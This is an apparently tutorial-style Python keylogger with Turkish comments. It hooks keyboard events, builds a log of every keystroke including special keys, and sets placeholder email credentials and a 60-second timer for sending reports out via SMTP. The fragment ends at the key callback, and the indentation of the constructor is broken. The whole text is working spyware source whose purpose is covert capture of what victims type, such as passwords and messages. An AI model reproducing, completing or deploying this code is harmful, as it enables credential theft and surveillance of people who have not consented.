import keyboard # klavye kayitlarini kaydetmek icin
import smtplib #smtp protokolu araciligiyla e-posta gonderme
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 #saniye
EMAIL_ADDRESS = "e-posta adresiniz"
EMAIL_PASSWORD = "sifreniz"

class Keylogger:
 def __init__(self, interval, report_method="email"):
# SEND_REPORT_EVERY degiskenini interval olarak gececegiz
self.interval = interval
self.report_method = report_method
# self.interval icindeki tum tus vuruslarininn kaydinin bulundugu string degiskeni
self.log =""
# baslangic ve bitis tarih saatlerini kaydedin
self.start_dt = datetime.now()
self.end_dt = datetime.now()
def callback(self, event):
    """
    Bu callback, herhangi bir klavye olayi meydana geldiginde cagirilir
    (bu ornekte bir tus serbest birakildiginda)
    """
    ad = event.name
    if len(ad) > 1:
        # karakter degil, ozel bir tus (ornegin, ctrl, alt, vb.)
        # [] icinde buyuk harfle yazilir
        if ad == "space":
            # "space" yerine " " kullan
            ad = " "
        elif ad == "enter":
            # ENTER tusuna basildiginda yeni bir satir ekler
            ad = "[ENTER]\n"
        elif ad == "decimal":
            ad = "."
        else:
            # bosluklari alt cizgiyle degistir
            ad = ad.replace(" ", "_")
            ad = f"[{ad.upper()}]"
    # son olarak, tus adini global `self.log` degiskenimize ekleyin
    self.log += ad
